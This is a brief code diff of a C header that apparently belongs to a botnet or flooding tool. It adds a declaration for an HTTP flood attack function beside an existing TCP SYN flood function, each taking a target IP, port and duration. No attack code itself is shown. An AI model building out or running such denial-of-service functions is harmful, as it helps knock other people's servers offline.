@@ -61,3 +61,4 @@ uint8_t parse_command_from_buffer(uint8_t []);
 
 //Attack inits
 void atk_start_tcp_essyn(char *target_ip, int target_port, int duration);
+void start_httplankton_attack(char *target_ip, int target_port, int duration);
